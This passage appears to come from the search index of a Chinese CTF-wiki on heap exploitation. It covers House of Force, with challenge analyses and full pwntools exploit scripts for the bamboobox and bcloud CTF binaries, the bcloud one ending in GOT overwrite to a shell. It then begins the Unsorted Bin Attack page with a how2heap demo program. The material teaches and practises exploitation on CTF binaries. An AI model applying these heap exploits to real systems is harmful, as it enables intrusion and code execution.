            "text": "\u279c  hitcontraning_lab11 git: ( master )  file bamboobox     \nbamboobox: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped\n\u279c  hitcontraning_lab11 git: ( master )  checksec bamboobox  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a 64 \u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_5", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5373\u7533\u8bf7\u4e86 0x10 \u7684\u5185\u5b58\uff0c\u7528\u6765\u4fdd\u7559 \u4e24\u4e2a\u51fd\u6570\u6307\u9488 \u3002  \u8be5\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u5bf9\u4e8e\u76d2\u5b50\u91cc\u7684\u7269\u54c1\u8fdb\u884c\u6dfb\u52a0\u548c\u5220\u9664   \u5c55\u793a\u76d2\u5b50\u91cc\u7684\u5185\u5bb9\uff0c\u4f9d\u6b21\u76d2\u5b50\u91cc\u6bcf\u4e00\u4e2a\u7269\u54c1\u7684\u540d\u5b57\u3002  \u5411\u76d2\u5b50\u91cc\u6dfb\u52a0\u7269\u54c1\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u4e3a\u6bcf\u4e00\u4e2a\u7269\u54c1\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u4f5c\u4e3a\u5176\u5b58\u50a8\u540d\u5b57\u7684\u7a7a\u95f4\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bfb\u53d6\u540d\u5b57\u4f7f\u7528\u7684\u662f  read  \u51fd\u6570\uff0c\u8bfb\u53d6\u957f\u5ea6\u7684\u53c2\u6570\u662f\u7528\u6237\u8f93\u5165\u7684 v2\uff0c\u800c read \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u8d1f\u6570\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u786e\u4fdd\u8be5\u6570\u503c\u6ee1\u8db3 REQUEST_OUT_OF_RANGE  \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u8fd9\u91cc\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002\u4f46\u5373\u4f7f\u8fd9\u6837\uff0c\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83\u96be\u4ee5\u5229\u7528\uff0c\u56e0\u4e3a\u521d\u59cb\u65f6\u5019\u5806\u7684 top chunk \u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e0d\u4f1a\u5f88\u5927\u7684\u3002  \u4fee\u6539\u7269\u54c1\u7684\u540d\u5b57\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\uff0c\u4ee5\u53ca\u5927\u5c0f\uff0c\u5411\u6307\u5b9a\u7d22\u5f15\u7684\u7269\u54c1\u4e2d\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u540d\u5b57\u3002\u8fd9\u91cc\u957f\u5ea6\u7531\u7528\u6237\u6765\u8bfb\u5165\uff0c\u4e5f\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002  \u5220\u9664\u7269\u54c1\uff0c\u5c06\u5bf9\u5e94\u7269\u54c1\u7684\u540d\u5b57\u7684\u5927\u5c0f\u7f6e\u4e3a0\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 content \u7f6e\u4e3a NULL\u3002   \u6b64\u5916\uff0c\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u6f14\u793a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 flag\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_6", 
            "text": "\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u6709\u4e2a magic \u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u6838\u5fc3\u76ee\u7684\u662f\u8986\u76d6\u67d0\u4e2a\u6307\u9488\u4e3a magic \u51fd\u6570\u7684\u6307\u9488\u3002\u8fd9\u91cc\uff0c\u7a0b\u5e8f\u5728\u5f00\u59cb\u7684\u65f6\u5019\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\u6765\u5b58\u50a8\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0chello_message\u7528\u4e8e\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4f7f\u7528\uff0cgoodbye_message \u7528\u4e8e\u5728\u7a0b\u5e8f\u7ed3\u675f\u65f6\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8986\u76d6 goodbye_message \u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b   \u6dfb\u52a0\u7269\u54c1\uff0c\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 top chunk \u7684\u5927\u5c0f\u4e3a -1\uff0c\u5373 64 \u4f4d\u6700\u5927\u503c\u3002  \u5229\u7528 house of force \u6280\u5de7\uff0c\u5206\u914d chunk \u81f3\u5806\u7684\u57fa\u5730\u5740\u3002  \u8986\u76d6 goodbye_message \u4e3amagic \u51fd\u6570\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41   \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u89e6\u53d1top chunk \u8f6c\u79fb\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u5927\u5c0f\u5e94\u8be5\u5408\u9002\uff0c\u4ee5\u4fbf\u4e8e\u8bbe\u7f6e\u65b0\u7684 top chunk \u5927\u5c0f\uff0c\u4ece\u800c\u53ef\u4ee5\u7ed5\u8fc7\u4e0b\u4e00\u6b21\u5206\u914dtop chunk \u7684\u68c0\u6d4b\u3002  exp \u5982\u4e0b  #!/usr/bin/env python  # -*- coding: utf-8 -*- \n\nfrom pwn import * r   =  process ( ./bamboobox ) \ncontext.log_level  =   debug \n\n\ndef additem ( length, name ) :\n    r.recvuntil ( : ) \n    r.sendline ( 2 ) \n    r.recvuntil ( : ) \n    r.sendline ( str ( length )) \n    r.recvuntil ( : ) \n    r.sendline ( name ) \n\n\ndef modify ( idx, length, name ) :\n    r.recvuntil ( : ) \n    r.sendline ( 3 ) \n    r.recvuntil ( : ) \n    r.sendline ( str ( idx )) \n    r.recvuntil ( : ) \n    r.sendline ( str ( length )) \n    r.recvuntil ( : ) \n    r.sendline ( name ) \n\n\ndef remove ( idx ) :\n    r.recvuntil ( : ) \n    r.sendline ( 4 ) \n    r.recvuntil ( : ) \n    r.sendline ( str ( idx )) \n\n\ndef show () :\n    r.recvuntil ( : ) \n    r.sendline ( 1 )  magic   =  0x400d49 # we must alloc enough size, so as to successfully alloc from fake topchunk \nadditem ( 0x30,  ddaa )    # idx 0  payload   =  0x30 *  a    # idx 0 s content  payload   +=   a  *  8  + p64 ( 0xffffffffffffffff )    # top chunk s prev_size and size  # modify topchunk s size to -1 \nmodify ( 0 , 0x41, payload )  # top chunk s offset to heap base  offset_to_heap_base   =  - ( 0x40 + 0x20 )  malloc_size   =  offset_to_heap_base - 0x8 - 0xf #gdb.attach(r) \nadditem ( malloc_size,  dada ) \nadditem ( 0x10, p64 ( magic )  *  2 ) \nprint r.recv () \nr.interactive ()   \u5f53\u7136\uff0c\u8fd9\u4e00\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528 unlink \u7684\u65b9\u6cd5\u6765\u505a\u3002", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#2016-bctf-bcloud", 
            "text": "", 
            "title": "2016 BCTF bcloud"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_7", 
            "text": "\u279c  2016_bctf_bcloud git: ( master )  file bcloud   \nbcloud: ELF  32 -bit LSB executable, Intel  80386 , version  1   ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped\n\u279c  2016_bctf_bcloud git: ( master )  checksec bcloud   [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 32 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_8", 
            "text": "\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u4e91\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8bbe\u7f6e\u7528\u6237\u7684\u540d\u5b57\uff0c\u7ec4\u7ec7\uff0chost\u3002\u7a0b\u5e8f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd   \u65b0\u5efanote\uff0c\u6839\u636e\u7528\u6237\u7684\u8f93\u5165x\u7533\u8bf7x+4\u7684\u7a7a\u95f4\u4f5c\u4e3anote\u7684\u5927\u5c0f\u3002  \u5c55\u793anote\uff0c\u5565\u529f\u80fd\u4e5f\u6ca1\u6709\u3002\u3002  \u7f16\u8f91note\uff0c\u6839\u636e\u7528\u6237\u6307\u5b9a\u7684 note \u7f16\u8f91\u5bf9\u5e94\u7684\u5185\u5bb9\u3002  \u5220\u9664note\uff0c\u5220\u9664\u5bf9\u5e94note\u3002  \u540c\u6b65note\uff0c\u6807\u8bb0\u6240\u6709\u7684note\u5df2\u7ecf\u88ab\u540c\u6b65\u3002   \u7136\u800c\u5728\u8fd9\u4e94\u4e2a\u529f\u80fd\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u5565\u6f0f\u6d1e\uff0c\uff0c\uff0c\u91cd\u65b0\u770b\u7a0b\u5e8f\uff0c\u7ed3\u679c\u53d1\u73b0\u7a0b\u5e8f\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6f0f\u6d1e\u3002\u3002  \u521d\u59cb\u5316\u540d\u5b57  unsigned   int   init_name ()  { \n   char   s ;   // [esp+1Ch] [ebp-5Ch] \n   char   * tmp ;   // [esp+5Ch] [ebp-1Ch] \n   unsigned   int   v3 ;   // [esp+6Ch] [ebp-Ch] \n\n   v3   =   __readgsdword ( 0x14u ); \n   memset ( s ,   0 ,   0x50u ); \n   puts ( Input your name: ); \n   read_str ( s ,   64 ,   \\n ); \n   tmp   =   ( char   * ) malloc ( 0x40u ); \n   name   =   tmp ; \n   strcpy ( tmp ,   s ); \n   info ( tmp ); \n   return   __readgsdword ( 0x14u )   ^   v3 ;  }   \u8fd9\u91cc\u5982\u679c\u7a0b\u5e8f\u8bfb\u5165\u7684\u540d\u5b57\u4e3a64\u4e2a\u5b57\u7b26\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u5728\u4f7f\u7528info\u51fd\u6570\u8f93\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5c31\u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684tmp\u6307\u9488\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u8bf4 \u6cc4\u9732\u4e86\u5806\u7684\u5730\u5740 \u3002\u3002  \u521d\u59cb\u5316\u7ec4\u7ec7\u548corg\u7684\u65f6\u5019\u5b58\u5728\u6f0f\u6d1e  unsigned   int   init_org_host ()  { \n   char   s ;   // [esp+1Ch] [ebp-9Ch] \n   char   * v2 ;   // [esp+5Ch] [ebp-5Ch] \n   char   v3 ;   // [esp+60h] [ebp-58h] \n   char   * v4 ;   // [esp+A4h] [ebp-14h] \n   unsigned   int   v5 ;   // [esp+ACh] [ebp-Ch] \n\n   v5   =   __readgsdword ( 0x14u ); \n   memset ( s ,   0 ,   0x90u ); \n   puts ( Org: ); \n   read_str ( s ,   64 ,   10 ); \n   puts ( Host: ); \n   read_str ( v3 ,   64 ,   10 ); \n   v4   =   ( char   * ) malloc ( 0x40u ); \n   v2   =   ( char   * ) malloc ( 0x40u ); \n   org   =   v2 ; \n   host   =   v4 ; \n   strcpy ( v4 ,   v3 ); \n   strcpy ( v2 ,   s ); \n   puts ( OKay! Enjoy:) ); \n   return   __readgsdword ( 0x14u )   ^   v5 ;  }   \u5f53\u8bfb\u5165\u7ec4\u7ec7\u65f6\uff0c\u7ed9\u5b9a 64 \u5b57\u8282\uff0c\u4f1a\u8986\u76d6 v2 \u7684\u4f4e\u5730\u5740\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 v2 \u662f\u4e0e top chunk \u76f8\u90bb\u7684 chunk\uff0c\u800c v2 \u6070\u597d\u4e0e org \u76f8\u90bb\uff0c\u90a3\u4e48\u7531\u4e8e\u5728 32 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u822c\u90fd\u662f 32 \u4f4d\u5168\u90e8\u90fd\u4f7f\u7528\uff0c\u8fd9\u91cc v2 \u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u51e0\u4e4e\u5f88\u5927\u7a0b\u5ea6\u4e0a\u90fd\u4e0d\u662f  \\x00  \uff0c\u6240\u4ee5\u5f53\u6267\u884c strcpy \u51fd\u6570\u5411 v2 \u4e2d\u62f7\u8d1d\u5185\u5bb9\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u8986\u76d6top chunk\u3002\u8fd9\u5c31\u662f\u6f0f\u6d1e\u6240\u5728\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_9", 
            "text": "\u5229\u7528\u521d\u59cb\u5316\u540d\u5b57\u5904\u7684\u6f0f\u6d1e\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\u3002\u3002  \u5229\u7528 house of force \u5c06 top chunk \u5206\u914d\u81f3\u5168\u5c40\u7684 0x0804B0A0 \u7684  notesize-8 \u5904\uff0c\u5f53\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u4fbf\u8fd4\u56denotesize\u5730\u5740\u5904\u7684\u5185\u5b58\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6240\u6709note\u7684\u5927\u5c0f\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002  \u4fee\u6539\u524d\u4e09\u4e2a note \u7684\u5927\u5c0f\u4e3a16\uff0c\u5e76\u4fee\u6539\u5176\u6307\u9488\u4e3a free@got\uff0catoi@got\uff0catoi@got  \u5c06 free@got \u4fee\u6539\u4e3a puts@plt\u3002  \u6cc4\u6f0f atoi \u5730\u5740\u3002  \u518d\u6b21\u4fee\u6539\u53e6\u5916\u4e00\u4e2a atoi got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u62ff\u5230shell\u3002   \u5177\u4f53\u811a\u672c\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./bcloud  bcloud   =   ELF ( ./bcloud )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 )  else : \n     p   =   process ( ./bcloud )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  def   offset_bin_main_arena ( idx ): \n     word_bytes   =   context . word_size   /   8 \n     offset   =   4    # lock \n     offset   +=   4    # flags \n     offset   +=   word_bytes   *   10    # offset fastbin \n     offset   +=   word_bytes   *   2    # top,last_remainder \n     offset   +=   idx   *   2   *   word_bytes    # idx \n     offset   -=   word_bytes   *   2    # bin overlap \n     return   offset  def   exp (): \n     # leak heap base \n     p . sendafter ( Input your name: \\n ,   a   *   64 ) \n     p . recvuntil ( Hey    +   a   *   64 ) \n     # sub name s chunk  s header \n     heap_base   =   u32 ( p . recv ( 4 ))   -   8 \n     log . success ( heap_base:    +   hex ( heap_base )) \n     p . sendafter ( Org: \\n ,   a   *   64 ) \n     p . sendlineafter ( Host: \\n ,   p32 ( 0xffffffff )) \n     # name,org,host, for each is (0x40+8) \n     topchunk_addr   =   heap_base   +   ( 0x40   +   8 )   *   3 \n\n     # make topchunk point to 0x0804B0A0-8 \n     p . sendlineafter ( option--- ,   1 ) \n     notesize_addr   =   0x0804B0A0 \n     notelist_addr   =   0x0804B120 \n     targetaddr   =   notesize_addr   -   8 \n     offset_target_top   =   targetaddr   -   topchunk_addr \n     # 4 for size_t, 7 for malloc_allign \n     malloc_size   =   offset_target_top   -   4   -   7 \n     # plus 4 because malloc(v2 + 4); \n     p . sendlineafter ( Input the length of the note content: \\n , \n                     str ( malloc_size   -   4 )) \n     # most likely malloc_size-4 0... \n     if   malloc_size   -   4     0 : \n         p . sendlineafter ( Input the content: \\n ,   ) \n\n     #gdb.attach(p) \n     # set notesize[0] = notesize[1] = notesize[2]=16 \n     # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got \n     p . sendlineafter ( option--- ,   1 ) \n     p . sendlineafter ( Input the length of the note content: \\n ,   str ( 1000 )) \n\n     payload   =   p32 ( 16 )   *   3   +   ( notelist_addr   -   notesize_addr   -   12 )   *   a   +   p32 ( \n         bcloud . got [ free ])   +   p32 ( bcloud . got [ atoi ])   *   2 \n     p . sendlineafter ( Input the content: \\n ,   payload ) \n\n     # overwrite free@got with puts@plt \n     p . sendlineafter ( option--- ,   3 ) \n     p . sendlineafter ( Input the id: \\n ,   str ( 0 )) \n     p . sendlineafter ( Input the new content: \\n ,   p32 ( bcloud . plt [ puts ])) \n\n     # leak atoi addr by fake free \n     p . sendlineafter ( option--- ,   4 ) \n     p . sendlineafter ( Input the id: \\n ,   str ( 1 )) \n     atoi_addr   =   u32 ( p . recv ( 4 )) \n     libc_base   =   atoi_addr   -   libc . symbols [ atoi ] \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     log . success ( libc base addr:    +   hex ( libc_base )) \n\n     # overwrite atoi@got with system \n     p . sendlineafter ( option--- ,   3 ) \n     p . sendlineafter ( Input the id: \\n ,   str ( 2 )) \n     p . sendlineafter ( Input the new content: \\n ,   p32 ( system_addr )) \n\n     # get shell \n     p . sendlineafter ( option--- ,   /bin/sh \\x00 ) \n     p . interactive ()  if   __name__   ==   __main__ : \n     exp ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_10", 
            "text": "2016 Boston Key Party CTF cookbook", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/", 
            "text": "Unsorted Bin Attack\n\n\n\u6982\u8ff0\n\n\nUnsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002\n\n\nUnsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002\n\n\nUnsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002\n\n\nUnsorted Bin \u56de\u987e\n\n\n\u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002\n\n\n\u57fa\u672c\u6765\u6e90\n\n\n\n\n\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002\n\n\n\u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8etop chunk\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002\n\n\n\u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002\n\n\n\n\n\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\n\n\n\n\nUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c\n\u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6\n\u3002\n\n\n\u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002\n\n\n\n\n\u539f\u7406\n\n\n\u8fd9\u91cc\u6211\u4ee5 shellfish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684 \nunsorted_bin_attack.c\n \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n\nint\n \nmain\n()\n \n{\n\n  \nfprintf\n(\nstderr\n,\n \nThis file demonstrates unsorted bin attack by write a large \n\n                  \nunsigned long value into stack\n\\n\n);\n\n  \nfprintf\n(\n\n      \nstderr\n,\n\n      \nIn practice, unsorted bin attack is generally prepared for further \n\n      \nattacks, such as rewriting the \n\n      \nglobal variable global_max_fast in libc for further fastbin attack\n\\n\\n\n);\n\n\n  \nunsigned\n \nlong\n \ntarget_var\n \n=\n \n0\n;\n\n  \nfprintf\n(\nstderr\n,\n\n          \nLet\ns first look at the target we want to rewrite on stack:\n\\n\n);\n\n  \nfprintf\n(\nstderr\n,\n \n%p: %ld\n\\n\\n\n,\n \ntarget_var\n,\n \ntarget_var\n);\n\n\n  \nunsigned\n \nlong\n \n*\np\n \n=\n \nmalloc\n(\n400\n);\n\n  \nfprintf\n(\nstderr\n,\n \nNow, we allocate first normal chunk on the heap at: %p\n\\n\n,\n\n          \np\n);\n\n  \nfprintf\n(\nstderr\n,\n \nAnd allocate another normal chunk in order to avoid \n\n                  \nconsolidating the top chunk with\n\n                  \nthe first one during the free()\n\\n\\n\n);\n\n  \nmalloc\n(\n500\n);\n\n\n  \nfree\n(\np\n);\n\n  \nfprintf\n(\nstderr\n,\n \nWe free the first chunk now and it will be inserted in the \n\n                  \nunsorted bin with its bk pointer \n\n                  \npoint to %p\n\\n\n,\n\n          \n(\nvoid\n \n*\n)\np\n[\n1\n]);\n\n\n  \n/*------------VULNERABILITY-----------*/\n\n\n  \np\n[\n1\n]\n \n=\n \n(\nunsigned\n \nlong\n)(\ntarget_var\n \n-\n \n2\n);\n\n  \nfprintf\n(\nstderr\n,\n \nNow emulating a vulnerability that can overwrite the \n\n                  \nvictim-\nbk pointer\n\\n\n);\n\n  \nfprintf\n(\nstderr\n,\n \nAnd we write it with the target address-16 (in 32-bits \n\n                  \nmachine, it should be target address-8):%p\n\\n\\n\n,\n\n          \n(\nvoid\n \n*\n)\np\n[\n1\n]);\n\n\n  \n//------------------------------------\n\n\n  \nmalloc\n(\n400\n);\n\n  \nfprintf\n(\nstderr\n,\n \nLet\ns malloc again to get the chunk we just free. During \n\n                  \nthis time, target should has already been \n\n                  \nrewrite:\n\\n\n);\n\n  \nfprintf\n(\nstderr\n,\n \n%p: %p\n\\n\n,\n \ntarget_var\n,\n \n(\nvoid\n \n*\n)\ntarget_var\n);\n\n\n}\n\n\n\n\n\n\u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a\n\n\n\u279c  unsorted_bin_attack git:\n(\nmaster\n)\n \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack   \n\u279c  unsorted_bin_attack git:\n(\nmaster\n)\n \u2717 ./unsorted_bin_attack\nThis file demonstrates unsorted bin attack by write a large unsigned long value into stack\nIn practice, unsorted bin attack is generally prepared \nfor\n further attacks, such as rewriting the global variable global_max_fast in libc \nfor\n further fastbin attack\n\nLet\ns first look at the target we want to rewrite on stack:\n\n\n0x7ffe0d232518: 0\n\n\n\nNow, we allocate first normal chunk on the heap at: 0x1fce010\n\n\nAnd allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()\n\n\n\nWe free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\n\n\nNow emulating a vulnerability that can overwrite the victim-\nbk pointer\n\n\nAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508\n\n\n\nLet\ns malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002\n\n\n\n\n\u521d\u59cb\u72b6\u6001\u65f6\n\n\nunsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002\n\n\n\u6267\u884cfree(p)\n \n\n\n\u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\n\n\n\u4fee\u6539p[1]\n\n\n\u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002\n\n\n\u7533\u8bf7400\u5927\u5c0f\u7684chunk\n\n\n\u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 